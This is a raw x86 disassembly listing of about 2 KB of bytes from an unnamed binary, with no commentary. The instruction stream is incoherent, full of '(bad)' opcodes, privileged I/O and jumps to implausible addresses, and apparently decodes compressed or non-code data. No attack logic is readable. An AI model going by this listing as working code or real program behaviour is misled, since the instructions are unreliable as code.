  4091ab:	sub    BYTE PTR [ecx-0x71d7b6e7],ah
  4091b1:	daa    
  4091b2:	cmp    al,0x1b
  4091b4:	mov    fs,WORD PTR [edi]
  4091b6:	jle    0x4091d3
  4091b8:	pop    edi
  4091b9:	pusha  
  4091ba:	jbe    0x4091e4
  4091bc:	jbe    0x40922b
  4091be:	lea    esi,[eax]
  4091c0:	outs   dx,BYTE PTR ds:[esi]
  4091c1:	daa    
  4091c2:	push   ecx
  4091c3:	push   esp
  4091c4:	cdq    
  4091c5:	daa    
  4091c6:	pop    esi
  4091c7:	sub    BYTE PTR [eax],al
	...
  4091d9:	add    BYTE PTR [eax],al
  4091db:	add    BYTE PTR [esp+ecx*2+0x1856285e],ah
  4091e2:	and    DWORD PTR [ebx+0x4e],esp
  4091e5:	daa    
  4091e6:	inc    esi
  4091e7:	outs   dx,BYTE PTR ds:[esi]
  4091e8:	dec    ecx
  4091e9:	das    
  4091ea:	sub    BYTE PTR ds:[esi],bh
  4091ed:	lods   eax,DWORD PTR ds:[esi]
  4091ee:	jmp    esp
  4091f0:	popa   
  4091f1:	lods   eax,DWORD PTR ds:[esi]
  4091f2:	pop    es
  4091f3:	inc    ecx
  4091f4:	mov    ds:0x5126ff25,eax
  4091f9:	ins    DWORD PTR es:[edi],dx
  4091fa:	lock push ss
  4091fc:	push   ecx
  4091fd:	daa    
  4091fe:	call   0xff682c48
  409203:	push   cs
  409204:	iret   
  409205:	cs jmp 0xff67f13f
  40920b:	dec    ah
  40920d:	sub    ch,al
  40920f:	jmp    FWORD PTR [ebp+0x7420ff26]
  409215:	hlt    
  409216:	(bad)  
  409217:	cmp    esp,DWORD PTR [edx+0x14]
  40921a:	and    DWORD PTR [ebp+0x42ff9a11],0x41
  409221:	daa    
  409222:	jne    0x409205
  409224:	xor    ah,BYTE PTR [esi-0x63]
  409227:	(bad)  
  409228:	push   ds
  409229:	jns    0x409270
  40922b:	mov    ebp,0x283aad9d
  409230:	cmp    eax,0x8c343527
  409235:	mov    edi,0xfee8a5ff
  40923a:	out    0x1b,eax
  40923c:	push   eax
  40923d:	daa    
  40923e:	inc    DWORD PTR [ecx]
	...
  409254:	out    0xe9,al
  409256:	inc    eax
  409257:	jmp    0xe940930e
  40925c:	mov    edx,0x22f17526
  409261:	mov    al,ds:0x271e76fc
  409266:	jne    0x4092d5
  409268:	push   ss
  409269:	lods   eax,DWORD PTR ds:[esi]
  40926a:	pop    es
  40926b:	push   ecx
  40926c:	or     al,0x85
  40926e:	call   FWORD PTR [esi+0x1c]
  409271:	inc    edx
  409272:	add    al,0xe9
  409274:	imul   edi,DWORD PTR [ecx-0x14],0xfe2bf968
  40927b:	add    bh,bh
  40927d:	fisubr WORD PTR [ecx+0x0]
  409280:	push   0xfffffff7
  409282:	(bad)  
  409283:	jne    0x40929d
  409285:	or     dh,BYTE PTR [edx-0x63]
  409288:	pop    edi
  409289:	fisttp QWORD PTR [eax+0x3845c45]
  40928f:	add    DWORD PTR [eax],edx
  409291:	add    cl,BYTE PTR [ebp-0x121c87b]
  409297:	call   eax
  409299:	or     edx,edx
  40929b:	jno    0x4092ad
  40929d:	add    cl,BYTE PTR [ebx]
  40929f:	rol    BYTE PTR [ebp+ecx*2+0x1e1043c],0x0
  4092a7:	ja     0x40929e
  4092a9:	mov    DWORD PTR [esi-0x7303eec5],ecx
  4092af:	test   DWORD PTR [edi],eax
  4092b1:	fdiv   st(6),st
  4092b3:	call   DWORD PTR [eax]
  4092b5:	add    al,0xa9
  4092b7:	mov    ds:0x0,eax
	...
  4092cc:	(bad)  
  4092cd:	fimul  WORD PTR [edi+0x68]
  4092d0:	rol    BYTE PTR [ecx],1
  4092d2:	out    dx,eax
  4092d3:	mov    esi,0x874dd20
  4092d8:	js     0x4092ba
  4092da:	sar    bh,0xdf
  4092dd:	or     esi,esi
  4092df:	lahf   
  4092e0:	(bad)  
  4092e2:	(bad)  
  4092e3:	jne    0x4092a1
  4092e5:	fidiv  WORD PTR [eax+ecx*1-0x48]
  4092e9:	test   BYTE PTR [edi+edi*8+0x4c1e4bf],bl
  4092f0:	nop
  4092f1:	push   eax
  4092f2:	mov    ch,ah
  4092f4:	adc    esp,ebp
  4092f6:	sti    
  4092f7:	push   0x60
  4092f9:	xchg   DWORD PTR ds:0xe72965ff,ebx
  4092ff:	or     eax,0x89fedebd
  409304:	xchg   ebp,eax
  409305:	frstor [edi+0x0]
  409308:	cmp    DWORD PTR [edi],edx
  40930a:	push   ss
  40930b:	mov    esi,0x40e993e1
  409310:	cmp    DWORD PTR [edi+0x5c],ecx
  409313:	cmp    edi,eax
  409315:	push   ss
  409316:	es jne 0x40935a
  409319:	mov    edi,0xd62ec44f
  40931e:	and    eax,0xafde2575
  409323:	pop    es
  409324:	adc    DWORD PTR ds:0xe016ff88,esi
  40932a:	inc    eax
  40932b:	add    al,0x39
  40932d:	ins    BYTE PTR es:[edi],dx
  40932e:	jp     0x40931c
	...
  409344:	mov    eax,0xfef74ed2
  409349:	and    eax,0x86f54577
  40934e:	es jne 0x40939a
  409351:	push   ss
  409352:	scas   eax,DWORD PTR es:[edi]
  409353:	or     edx,ecx
  409355:	inc    edx
  409356:	mov    bl,0xff
  409358:	fidiv  WORD PTR [ecx]
  40935a:	inc    ebx
  40935b:	bsf    eax,DWORD PTR [edx+0x3]
  40935f:	add    BYTE PTR [ecx],bh
  409361:	pop    esi
  409362:	mov    edi,0x31739f7
  409367:	add    dh,dh
  409369:	fld    TBYTE PTR [edi]
  40936b:	(bad)  
  40936c:	ds pop ss
  40936e:	add    ebp,DWORD PTR [edx+0x39]
  409371:	rol    DWORD PTR [ebx],0x6a
  409374:	cmp    DWORD PTR [ecx],edx
  409376:	add    al,0x8d
  409378:	hlt    
  409379:	mov    dl,ah
  40937b:	mov    WORD PTR [edx+eax*4-0x197100d3],?
  409382:	and    al,0x75
  409384:	cmp    DWORD PTR [ebp-0x51],0xb35c91fb
  40938b:	push   DWORD PTR [esi+0x21]
  40938e:	inc    ebx
  40938f:	je     0x4093c5
  409391:	sub    BYTE PTR [ebp+0x1],0x39
  409395:	add    cl,ch
  409397:	fwait
  409398:	push   esp
  409399:	xlat   BYTE PTR ds:[ebx]
  40939a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40939b:	add    edx,DWORD PTR [esi-0x56]
  40939e:	clc    
  40939f:	sbb    esp,DWORD PTR [eax+0x61]
  4093a2:	dec    esi
  4093a3:	and    eax,0x771978e9
	...
  4093bc:	mov    ah,0x2b
  4093be:	ss and eax,0x1b9ad136
  4093c4:	adc    BYTE PTR [edi+0x2e],bl
  4093c7:	and    eax,0x2d197db0
  4093cc:	push   ds
  4093cd:	and    al,0x11
  4093cf:	aad    0xb7
  4093d1:	and    edx,DWORD PTR [esi]
  4093d3:	ja     0x409389
  4093d5:	and    BYTE PTR [esi],dl
  4093d7:	and    eax,0x7090d106
  4093dc:	inc    edx
  4093dd:	shr    eax,0x24
  4093e0:	lods   al,BYTE PTR ds:[esi]
  4093e1:	xor    dh,bh
  4093e3:	and    al,0xee
  4093e5:	and    esi,DWORD PTR [edi+esi*8-0x22]
  4093e9:	aad    0x8a
  4093eb:	and    al,0xde
  4093ed:	jns    0x409453
  4093ef:	pop    ds
  4093f0:	into   
  4093f1:	and    edx,esi
  4093f3:	cdq    
  4093f4:	into   
  4093f5:	fwait
  4093f6:	mov    eax,gs
  4093f8:	jns    0x4093fa
  4093fa:	(bad)  
  4093fb:	outs   dx,BYTE PTR ds:[esi]
  4093fc:	leave  
  4093fd:	sub    edi,DWORD PTR [esi-0x1b5249dc]
  409403:	sbb    ecx,DWORD PTR [ebx+0x5e]
  409406:	scas   al,BYTE PTR es:[edi]
  409407:	and    al,0xb0
  409409:	jge    0x4093a0
  40940b:	sub    al,0x9e
  40940d:	and    edx,DWORD PTR [ebx]
  40940f:	add    al,0x21
  409411:	inc    eax
  409412:	rol    dl,cl
  409414:	mov    fs,WORD PTR [edx]
  409416:	push   esp
  409417:	xor    ecx,DWORD PTR [esi+0x4248623]
  40941d:	hlt    
  40941e:	nop
  40941f:	sub    al,0x0
	...
  409431:	add    BYTE PTR [eax],al
  409433:	add    BYTE PTR [eax-0xc89ffdd],bl
  409439:	jl     0x409423
  40943b:	jbe    0x40945a
  40943d:	and    ebp,DWORD PTR [edx-0x17]
  409440:	ret    0x3b38
  409443:	test   al,0x3a
  409445:	and    esi,DWORD PTR [ebp-0xdce2a7]
  40944b:	dec    esi
  40944c:	xchg   edi,eax
  40944d:	mul    edi
  40944f:	and    eax,0x70ff22db
  409454:	mov    bh,0x44
  409456:	div    DWORD PTR [esi]
  409458:	push   ebp
  409459:	xchg   esi,eax
  40945a:	inc    eax
  40945c:	jne    0x409445
  40945e:	inc    eax
  40945f:	jmp    0x173101b9
  409464:	pop    ebp
  409465:	and    edi,edi
  409467:	pushf  
  409468:	push   es
  409469:	sbb    eax,ecx
  40946b:	dec    eax
  40946c:	pop    ebp
  40946d:	and    ecx,DWORD PTR [ecx-0xd48d94]
  409473:	(bad)  
  409474:	shl    DWORD PTR [edx],1
  409476:	addr16 fcmovbe st,st(6)
  409479:	mov    edi,0x3054edff
  40947e:	mul    esi
  409480:	sbb    ah,BYTE PTR [ebx]
  409482:	jne    0x409471
  409484:	and    bl,BYTE PTR [edx-0x5f]
  409487:	(bad)  
  409488:	sbb    bh,BYTE PTR [ecx-0x7b]
  40948b:	mov    ch,0x22
  40948d:	and    edi,edi
  40948f:	push   0x58
  409491:	sbb    al,0xf7
  409493:	mov    esi,0x3074005a
	...
  4094ac:	mov    dh,0x64
  4094ae:	in     al,dx
  4094af:	mov    dh,0x5a
  4094b1:	and    eax,DWORD PTR [eax]
  4094b3:	sbb    eax,0x91bd7dc5
  4094b8:	xor    ah,BYTE PTR [ebx]
  4094ba:	(bad)  
  4094bb:	jmp    0xf9a82e66
  4094c0:	cmp    dl,BYTE PTR [ebx]
  4094c2:	mov    esi,0x788b700
  4094c7:	call   0x3f3695
  4094cc:	out    0xc8,eax
  4094ce:	jmp    0x4094c7
  4094d0:	xlat   BYTE PTR ds:[ebx]
  4094d1:	fdivp  st(6),st
  4094d3:	jne    0x40953d
  4094d5:	(bad)  
  4094d6:	cmp    al,0x9b
  4094d8:	neg    esi
  4094da:	(bad)  
  4094db:	mov    ch,0xf8
  4094dd:	push   es
  4094de:	(bad)  
  4094df:	push   edi
  4094e1:	mov    BYTE PTR [edi],al
  4094e3:	call   0x3f380f
  4094e8:	ja     0x4094b1
  4094ea:	fcomip st,st(7)
  4094ec:	addr16 (bad) 
  4094ef:	mov    ch,0x7c
  4094f1:	add    eax,0x8757ffff
  4094f6:	pop    es
  4094f7:	call   0x3f3743
  4094fc:	daa    
  4094fd:	(bad)  
  4094fe:	xlat   BYTE PTR ds:[ebx]
  4094ff:	div    DWORD PTR [edi]
  409501:	(bad)  
  409503:	jne    0x40950d
  409505:	(bad)  
  409506:	or     al,0x9b
  409508:	neg    esi
  40950a:	(bad)  
  40950b:	mov    ch,0x44
  40950d:	add    eax,0xffff
	...
  409522:	add    BYTE PTR [eax],al
  409524:	xlat   BYTE PTR ds:[ebx]
  409525:	mov    BYTE PTR [edi],al
  409527:	call   0x3f3903
  40952c:	test   eax,0xdee7f7d3
  409532:	(bad)  
  409533:	jne    0x40950d
  409535:	aad    0xf0
  409537:	call   0x67c:0xb5fedef7
  40953e:	(bad)  
  40953f:	(bad)  
  409540:	js     0x409544
  409542:	popf   
  409543:	call   edi
  409545:	fidiv  WORD PTR [esp+ebp*8-0x17012141]
  40954c:	mov    al,0x80
  40954e:	(bad)  
  40954f:	(bad)  
  409550:	cmp    DWORD PTR [edx+0x728ee858],ecx
  409556:	and    ch,al
  409558:	xchg   esp,eax
  409559:	pushf  
  40955a:	and    edi,edi
  40955c:	jbe    0x40954a
  40955e:	imul   DWORD PTR ds:[esi-0x56]
  409562:	sub    bl,dl
  409564:	les    edx,FWORD PTR [edx-0x405b00df]
  40956a:	sbb    edi,edi
  40956c:	push   esi
  40956d:	iret   
  40956e:	push   ecx
  40956f:	popf   
  409570:	dec    esi
  409571:	retf   0xb521
  409574:	ins    DWORD PTR es:[edi],dx
  409575:	retf   0xff21
  409578:	push   ecx
  409579:	sar    DWORD PTR [edi-0x1],cl
  40957c:	ss loop 0x4095d6
  40957f:	lock es jmp 0x7522:0x43acff21
	...
  40959c:	xor    DWORD PTR [edi],ecx
  40959e:	or     bh,dh
  4095a0:	push   ss
  4095a1:	add    ah,BYTE PTR [edx]
  4095a3:	mov    ch,0x9
  4095a5:	add    ah,BYTE PTR [edx]
  4095a7:	call   DWORD PTR [ecx]
  4095a9:	mov    edi,0xf9feff7f
  4095ae:	(bad)  
  4095af:	mul    eax
  4095b1:	sbb    eax,0x29eeff21
  4095b6:	xchg   edi,eax
  4095b7:	sti    
  4095b8:	shl    DWORD PTR [ecx+esi*4],1
  4095bb:	(bad)  
  4095bc:	fisubr WORD PTR [edi+0x46]
  4095bf:	or     al,0x39
  4095c1:	in     al,dx
  4095c2:	mov    esp,gs
  4095c4:	mov    edx,0x396a2052
  4095c9:	mov    ebp,0x2f44ff00
  4095ce:	sub    edi,DWORD PTR [edx-0x76de9e2d]
  4095d4:	hlt    
  4095d5:	push   0xffffffac
  4095d7:	(bad)  [edx-0x28]
  4095da:	add    edi,edi
  4095dc:	add    BYTE PTR fs:[ebx+ebp*8],bl
  4095e0:	stc    
  4095e1:	call   FWORD PTR [ebp-0x56e7c969]
  4095e7:	pop    ds
  4095e8:	xchg   BYTE PTR [eax],ah
  4095ea:	add    DWORD PTR [eax+0x42],eax
  4095ed:	mov    edi,0x38abe8
  4095f2:	jmp    0xe0eb047a
  4095f7:	sub    edx,DWORD PTR [edi+0x5e216e22]
  4095fd:	stos   BYTE PTR es:[edi],al
  4095fe:	and    DWORD PTR fs:[eax],eax
	...
  409611:	add    BYTE PTR [eax],al
  409613:	add    ah,cl
  409615:	not    DWORD PTR [eax+0x4f]
  409618:	mov    bl,0x20
  40961a:	push   esi
  40961b:	dec    ebx
  40961c:	jnp    0x409619
  40961e:	call   0x6a5449d9
  409623:	dec    eax
  409624:	xor    eax,0x2ead95b7
  409629:	stos   BYTE PTR es:[edi],al
  40962a:	or     BYTE PTR [ecx],ah
  40962c:	lods   al,BYTE PTR ds:[esi]
  40962d:	or     BYTE PTR [ecx-0x4f],al
  409630:	rcr    BYTE PTR [edi],0x26
  409633:	mov    edi,DWORD PTR [esp+ebx*1+0x72]
  409637:	xlat   BYTE PTR ds:[ebx]
  409638:	mov    esp,0xb203a7e8
  40963d:	fnstsw WORD PTR [edx-0x14]
  409640:	jns    0x409642
  409642:	imul   esp,ecx,0xab8793f6
  409648:	and    ah,bl
  40964a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40964b:	add    ecx,DWORD PTR [edi-0x214ecad8]
  409651:	pop    ds
  409652:	cmp    DWORD PTR [esp+esi*1+0x660427dc],ebp
  409659:	sub    BYTE PTR [ecx+0x331fc6b0],al
  40965f:	or     eax,0xcec95f9
  409664:	mov    edx,DWORD PTR [edx+edx*1+0x4696ba]
  40966b:	(bad)  
  40966c:	pop    ecx
  40966d:	pop    ds
  40966e:	push   0xffc07ef7
  409673:	cmp    BYTE PTR [ebp+0x25],ah
  409676:	mov    al,ds:0x9e
	...
  40968b:	add    BYTE PTR [ecx-0x50],bl
  40968e:	addr16 jmp 0x1fec5ce
  409694:	push   0xffffffdb
  409696:	inc    eax
  409697:	jmp    0xf1b5b546
  40969c:	and    ch,BYTE PTR [ebp-0x3f]
  40969f:	jbe    0x4096ba
  4096a1:	sub    cl,bl
  4096a3:	dec    ebp
  4096a4:	sbb    DWORD PTR [edi],ebx
  4096a6:	jmp    0x409690
  4096a8:	sbb    BYTE PTR [edi+0x19a7e93d],0x46
  4096af:	push   ebp
  4096b0:	ins    DWORD PTR es:[edi],dx
  4096b1:	pop    edi
  4096b2:	mov    ecx,0xff1f194e
  4096b7:	cmp    ebp,DWORD PTR [eax-0x464bf928]
  4096bd:	push   ds
  4096be:	jne    0x4096f5
  4096c0:	pop    ecx
  4096c1:	xchg   ebp,eax
  4096c2:	pop    es
  4096c3:	inc    ecx
  4096c4:	pop    es
  4096c5:	jns    0x4096c6
  4096c7:	es stc 
  4096c9:	mov    esp,0x362bc8
  4096ce:	push   ebp
  4096cf:	bound  edx,QWORD PTR [esi-0x7d]
  4096d2:	les    ecx,FWORD PTR ds:0x60b9559
  4096d8:	iret   
  4096d9:	push   es
  4096da:	call   0xff6008a4
  4096df:	pusha  
  4096e0:	call   FWORD PTR [edx]
  4096e2:	push   DWORD PTR [esi+edi*1+0x1f]
  4096e6:	jne    0x4096d9
  4096e8:	and    dh,BYTE PTR [esp+edx*4-0x22]
  4096ec:	mov    ecx,DWORD PTR cs:[ebp-0x1b]
	...
  409704:	xor    eax,DWORD PTR [eax+0x74]
  409707:	sub    edi,DWORD PTR [edx+0x74ffffd8]
  40970d:	and    esi,edi
  40970f:	jne    0x4096fd
  409711:	jmp    0x4096a7
  409713:	pushf  
  409714:	out    dx,eax
  409715:	dec    BYTE PTR [edi-0x1]
  409718:	gs lock (bad) 
  40971b:	jne    0x4096f9
  40971d:	push   ebx
  40971e:	(bad)  
  40971f:	jne    0x4096a9
  409721:	jmp    0x8b59:0xfeaf96cb
  409728:	sbb    eax,0x603982f0
  40972d:	ja     0x409738
  40972f:	push   edx
  409730:	enter  0x9b5e,0xff
  409734:	out    dx,eax
  409735:	sub    bh,BYTE PTR [edi+0x7d8184eb]
  40973b:	adc    BYTE PTR [eax+0x76],ah
  40973e:	pop    es
  40973f:	mov    edx,DWORD PTR [ebp-0x138a01ee]
  409745:	mov    es,WORD PTR [eax]
  409747:	mov    edx,DWORD PTR [edx]
  409749:	jmp    0x40974c
  40974b:	sub    esp,DWORD PTR [eax-0x35]
  40974e:	ror    DWORD PTR [eax+eiz*1],0x59
  409752:	mov    ch,ah
  409754:	outs   dx,DWORD PTR ds:[esi]
  409755:	ja     0x409762
  409757:	jmp    ebp
  409759:	or     eax,ebp
  40975b:	mov    ecx,0xfffefd96
  409760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409761:	or     eax,0x9a5ff50
  409766:	call   0x40979c
	...
  40977b:	add    BYTE PTR [edi+0x22c9fefd],al
  409781:	or     al,0x0
  409783:	push   ebp
  409784:	imul   edx,eax,0xffffff82
  409787:	les    edx,FWORD PTR [eax]
  409789:	push   esi
  40978a:	push   esi
  40978b:	push   ebx
  40978c:	push   ebx
  40978d:	pop    edi
  40978e:	pop    es
  40978f:	add    BYTE PTR [edx+edx*1-0x7e],dh
  409793:	jge    0x409771
  409795:	add    DWORD PTR [esp+ecx*1+0x39],esi
  409799:	stos   BYTE PTR es:[edi],al
  40979a:	lahf   
  40979b:	(bad)  
  40979d:	mov    bl,0x5
  40979f:	xor    DWORD PTR [ebx+edi*1],0x3
  4097a3:	jne    0x4097e5
  4097a5:	repnz inc ebx
  4097a7:	pop    ebx
  4097a8:	push   es
  4097a9:	cmc    
  4097aa:	dec    esp
  4097ab:	ret    0x2749
  4097ae:	mov    al,BYTE PTR [ebp+0x45]
  4097b1:	stos   BYTE PTR es:[edi],al
  4097b2:	and    al,BYTE PTR [edi]
  4097b4:	mov    edx,0xd000ffc
  4097b9:	sub    ecx,DWORD PTR [edx]
  4097bb:	rol    BYTE PTR ds:0x12bfea20,0xe6
  4097c2:	mov    ebp,0x3377bc8
  4097c7:	mov    edi,esp
  4097c9:	cmp    al,BYTE PTR [edx-0x6055c920]
  4097cf:	adc    edi,DWORD PTR [ecx]
  4097d1:	cmp    eax,DWORD PTR [edi]
  4097d3:	or     edi,DWORD PTR [ecx+0x33]
  4097d6:	or     al,0x2b
  4097d8:	jns    0x40982c
  4097da:	mov    esi,0xf2e9705d
  4097df:	inc    DWORD PTR [eax]
	...
  4097f1:	add    BYTE PTR [eax],al
  4097f3:	add    BYTE PTR [ebx-0x1e],ah
  4097f6:	sbb    eax,0xc7ae3d75
  4097fb:	mov    edi,0xb436bba
  409800:	push   ds
  409801:	push   esp
  409802:	inc    ebx
  409803:	call   0xff5f1a0d
  409808:	or     eax,0xb2c3c790
  40980d:	jae    0x409856
  40980f:	mov    esi,0xffc44b79
  409814:	mov    cl,0x11
  409816:	add    eax,DWORD PTR [eax]
  409818:	cmp    DWORD PTR [edx],ebx
  40981a:	mov    bp,WORD PTR [edi+ebx*1-0x76]
  40981f:	dec    ebp
  409820:	sub    eax,0x7c8d661a
  409825:	add    cl,bl
  409827:	mov    ah,0xcf
  409829:	xchg   edx,eax
  40982a:	test   al,0x1d
  40982c:	dec    esp
  40982d:	inc    esp
  40982e:	rol    DWORD PTR [esp+edx*4+0x1c],0xce
  409833:	sbb    eax,0x81d1442c
  409838:	rcr    BYTE PTR [esi+edi*4],cl
  40983b:	sbb    eax,0xc7660c2c
  409840:	fiadd  WORD PTR [eax+0x1d324424]
  409846:	sbb    al,0x44
  409848:	mov    eax,ds:0x861d8287
  40984d:	xchg   BYTE PTR [eax+ecx*2],ch
  409850:	jge    0x4097d8
  409852:	and    al,0x48
  409854:	les    edx,FWORD PTR [edx+0x8978]
	...
  40986a:	add    BYTE PTR [eax],al
  40986c:	in     al,dx
  40986d:	inc    ebx
  40986e:	inc    eax
  40986f:	hlt    
  409870:	data16 sbb al,0xe9
  409873:	adc    BYTE PTR [ebp-0x61fd6a3],dl
  409879:	call   FWORD PTR [edi-0x16ffc6f7]
  40987f:	adc    BYTE PTR [ebp-0x4df42378],bl
  409885:	retf   0x10dc
  409888:	fisttp QWORD PTR [ebp+0x1b8923ac]
  40988e:	mov    ah,0x43
  409890:	es xchg esi,eax
  409892:	sub    al,0x2c
  409894:	mov    fs,WORD PTR [ebp+0x2e]
  409897:	sbb    eax,0x2c2c9616
  40989c:	dec    ebx
  40989d:	ja     0x4098bd
  40989f:	sbb    eax,0x139c8e05
  4098a4:	lods   al,BYTE PTR ds:[esi]
  4098a5:	popf   
  4098a6:	and    BYTE PTR [ebx+0x49],bl
  4098a9:	add    cl,ch
  4098ab:	add    ebp,edx
  4098ad:	fs ins BYTE PTR es:[edi],dx
  4098af:	xchg   edi,eax
  4098b0:	push   es
  4098b1:	pop    edx
  4098b2:	add    cl,ah
  4098b4:	cmp    al,BYTE PTR [eax]
  4098b6:	add    dl,bh
  4098b8:	pop    esi
  4098b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098ba:	add    BYTE PTR [edi+esi*8+0x43],dh
  4098be:	push   eax
  4098bf:	rcl    DWORD PTR [eax],1
  4098c1:	mov    WORD PTR [eax],es
  4098c3:	jmp    0x62502e79
  4098c8:	xlat   BYTE PTR ds:[ebx]
  4098c9:	out    dx,eax
  4098ca:	rcl    dh,0x39
  4098cd:	pop    es
  4098ce:	push   DWORD PTR ds:0x0
	...
  4098e4:	fsub   QWORD PTR [esi]
  4098e6:	pcmpgtb mm6,QWORD PTR [edi+0x23]
  4098ea:	push   eax
  4098eb:	pop    ss
  4098ec:	iret   
  4098ed:	and    edi,DWORD PTR [ebx+0x76]
  4098f0:	cmp    al,BYTE PTR [eax]
  4098f2:	and    DWORD PTR [edi-0x69f534ce],0xffffffa7
  4098f9:	sub    al,0xf
  4098fb:	push   edi
  4098fc:	jl     0x409918
  4098fe:	add    DWORD PTR [ecx-0x2dfe6cbe],0x4a
  409905:	out    0x74,eax
  409907:	fldcw  WORD PTR [ebx]
  409909:	sub    ch,BYTE PTR [edx-0x17]
  40990c:	mov    al,ds:0xa0e9691b
  409911:	sbb    edx,DWORD PTR [ebp+0x5e]
  409914:	scas   eax,DWORD PTR es:[edi]
  409915:	or     ebp,DWORD PTR [edx-0x17]
  409918:	nop
  409919:	sbb    esp,edi
  40991b:	psubsw mm3,QWORD PTR [edx]
  40991e:	push   edx
  409920:	jp     0x4098b6
  409922:	sub    BYTE PTR [ecx+0x53d422ea],bl
  409928:	cmp    eax,0xd3118b1b
  40992d:	test   al,0xff
  40992f:	xchg   edx,eax
  409930:	cmp    dh,BYTE PTR [ecx-0x6ada48ae]
  409936:	jae    0x1403f76
  40993c:	mul    DWORD PTR [esi+0x7e0ffff]
  409942:	shl    BYTE PTR [ebp-0x18],0x4f
  409946:	out    0x9d,eax
	...
  40995c:	mov    bh,ah
  40995e:	(bad)  
  40995f:	sub    ebp,DWORD PTR [ebx]
  409961:	mov    bl,al
  409963:	pop    ebx
  409964:	ja     0x4099bc
  409966:	enter  0xc0c2,0xfe
  40996a:	push   esp
  40996b:	mov    esi,esp
  40996d:	add    ah,0xf0
  409970:	outs   dx,DWORD PTR ds:[esi]
  409971:	push   ebx
  409972:	sub    bl,bl
  409974:	ja     0x4099e6
  409976:	or     edi,edi
  409978:	ins    DWORD PTR es:[edi],dx
  409979:	or     al,0xe8
  40997b:	add    ebp,edi
  40997d:	idiv   dh
  40997f:	push   eax
  409980:	out    0x70,eax
  409982:	pop    es
  409983:	call   0x3f2776
  409988:	or     edi,esp
  40998a:	push   edi
  40998b:	add    ebp,DWORD PTR [eax+0x1f74c00a]
  409991:	mov    DWORD PTR [ebp-0xc],eax
  409994:	push   eax
  409995:	div    DWORD PTR [esp+ecx*1-0x19]
  409999:	jo     0x4099a2
  40999b:	call   0x3f929b
  4099a0:	fld    DWORD PTR [eax-0x5]
  4099a3:	lea    ebx,[ebp+0x6dff4fee]
  4099a9:	add    bh,bh
  4099ab:	jne    0x409a05
  4099ad:	out    0x98,al
  4099af:	std    
  4099b0:	xchg   ebp,esi
  4099b2:	mov    BYTE PTR [ebp+0x78],al
  4099b5:	cmc    
  4099b6:	je     0x4099a8
  4099b8:	outs   dx,DWORD PTR ds:[si]
  4099ba:	idiv   edi
  4099bc:	fisttp QWORD PTR [ecx]
  4099be:	push   DWORD PTR [ebp+0x0]
	...
  4099d1:	add    BYTE PTR [eax],al
  4099d3:	add    BYTE PTR [esp+ebp*8+0x10],ah
  4099d7:	(bad)  
  4099d8:	push   edi
  4099d9:	cmc    
  4099da:	mov    bl,al
  4099dc:	daa    
  4099dd:	outs   dx,DWORD PTR ds:[esi]
  4099de:	sti    
  4099df:	call   0xffbddd1d
  4099e4:	test   BYTE PTR [edx],0x91
  4099e7:	mul    ecx
  4099e9:	dec    ebx
  4099ea:	jge    0x4099eb
  4099ec:	out    0x6d,al
  4099ee:	add    edx,DWORD PTR [edi-0x22]
  4099f1:	pushf  
  4099f2:	or     ch,al
  4099f4:	mov    eax,ds:0xc2ff1ab8
  4099f9:	mov    si,0xf05e
  4099fd:	or     eax,DWORD PTR gs:[eax]
  409a00:	fs sahf 
  409a02:	xor    DWORD PTR es:[ebx+edi*1],0x1
  409a07:	jb     0x409a61
  409a09:	inc    edx
  409a0a:	nop
  409a0b:	xsha256 (bad)
  409a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a0d:	aam    0xb
  409a0f:	call   0xff5a55cc
  409a14:	xchg   esi,eax
  409a15:	aam    0xf3
  409a17:	inc    BYTE PTR [edi+ecx*1]
  409a1a:	sub    ebp,DWORD PTR [edi-0xe5857c]
  409a20:	add    al,0x17
  409a22:	sbb    dh,BYTE PTR [ebp+0x41]
  409a25:	jg     0x409a86
  409a27:	std    
  409a28:	outs   dx,BYTE PTR ds:[esi]
  409a29:	sbb    BYTE PTR [edx],0x75
  409a2c:	dec    ecx
  409a2d:	call   0xff1a:0xdd51078f
  409a34:	push   esi
  409a35:	sahf   
  409a36:	scas   eax,DWORD PTR es:[edi]
  409a37:	adc    eax,DWORD PTR [eax]
	...
  409a49:	add    BYTE PTR [eax],al
  409a4b:	add    al,al
  409a4d:	and    eax,0xba29751a
  409a52:	pop    DWORD PTR [edi]
  409a54:	push   ecx
  409a55:	mov    al,ds:0xa636ff17
  409a5a:	xchg   edi,eax
  409a5b:	or     edi,DWORD PTR [edx]
  409a5d:	pop    ecx
  409a5e:	icebp  
  409a5f:	(bad)  
  409a60:	lods   al,BYTE PTR ds:[esi]
  409a61:	aaa    
  409a62:	sbb    dh,BYTE PTR [ebp+0x31]
  409a65:	mov    edi,0xea16fc9a
  409a6a:	sbb    DWORD PTR [ebp+0x29],esi
  409a6d:	add    BYTE PTR [esi],ah
  409a6f:	nop
  409a70:	sub    BYTE PTR ds:[eax+ebx*1-0x6fe9e702],cl
  409a78:	inc    esi
  409a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a7a:	lock sbb ah,BYTE PTR [eax+ecx*1+0x11]
  409a7f:	outs   dx,BYTE PTR ds:[esi]
  409a80:	int    0x18
  409a82:	(bad)  
  409a83:	sbb    DWORD PTR [eax+esi*8-0xb],esp
  409a87:	(bad)  
  409a88:	ds sub ch,cl
  409a8b:	outs   dx,DWORD PTR ds:[esi]
  409a8c:	into   
  409a8d:	sbb    BYTE PTR [eax+0x34002946],dh
  409a93:	(bad)  
  409a94:	int    0x18
  409a96:	pop    esp
  409a97:	or     BYTE PTR [ebx],ah
  409a99:	dec    ebp
  409a9b:	(bad)  
  409a9c:	sub    BYTE PTR ss:[ebp+0x70],dh
  409aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa1:	sbb    BYTE PTR [esi+0x3c19328f],bh
  409aa7:	or     al,0xa1
  409aa9:	and    BYTE PTR [edi+0x3c848e19],ch
  409aaf:	hlt    
	...
  409ac4:	mov    cl,0xfd
  409ac6:	popf   
  409ac7:	(bad)  
  409ac8:	xor    bl,BYTE PTR [ecx]
  409aca:	sbb    al,0xc
  409acc:	popa   
  409acd:	xor    BYTE PTR [edi+0x1c846e19],cl
  409ad3:	lock mov cl,0xfd
  409ad6:	jge    0x409a67
  409ad8:	xor    bl,BYTE PTR [ecx]
